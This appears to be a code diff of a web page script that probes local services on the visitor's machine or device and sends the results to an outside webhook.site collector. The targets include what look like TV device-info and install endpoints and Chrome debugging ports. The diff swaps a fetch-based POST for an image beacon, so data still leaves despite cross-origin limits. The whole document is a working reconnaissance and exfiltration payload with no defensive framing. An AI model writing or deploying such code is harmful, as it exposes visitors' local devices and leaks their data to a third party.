@@ -5,22 +5,15 @@
 <script>
 const EXFIL = 'https://webhook.site/f223977d-60e6-4b93-8ae2-201d550e29c0';
 
-async function send(data) {
-  try {
-    await fetch(EXFIL, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: {'Content-Type': 'text/plain'},
-      body: JSON.stringify(data)
-    });
-  } catch(e) {}
+function send(data) {
+  const encoded = encodeURIComponent(JSON.stringify(data)).slice(0, 1800);
+  new Image().src = EXFIL + '?d=' + encoded;
 }
 
-async function probe(url, opts) {
+async function probe(url) {
   try {
-    const r = await fetch(url, opts || {});
-    const body = await r.text();
-    return {url, status: r.status, body: body.slice(0, 3000)};
+    const r = await fetch(url, {mode: 'no-cors'});
+    return {url, status: 'reached'};
   } catch(e) {
     return {url, error: e.toString()};
   }
@@ -33,24 +26,17 @@ async function main() {
     'http://127.0.0.1:7345/state/device/deviceinfo',
     'http://127.0.0.1:7345/scpl/install',
     'http://127.0.0.1:7345/scpl/update/override_group',
-    'http://127.0.0.1:7345/scpl/status',
-    'http://127.0.0.1:7345/menu_native/dynamic/tv_settings/system',
     'http://127.0.0.1:8012/',
     'http://127.0.0.1:9223/json',
-    'http://127.0.0.1:9223/json/version',
     'http://127.0.0.1:9222/json',
-    'http://127.0.0.1:10101/',
     'http://127.0.0.1:80/',
     'http://127.0.0.1:8080/',
-    'http://127.0.0.1:3000/',
-    'http://127.0.0.1:5000/',
-    'http://127.0.0.1:1080/',
   ];
 
   for (const url of targets) {
     const result = await probe(url);
     send(result);
-    await new Promise(r => setTimeout(r, 300));
+    await new Promise(r => setTimeout(r, 500));
   }
 
   send({status: 'probe_complete'});
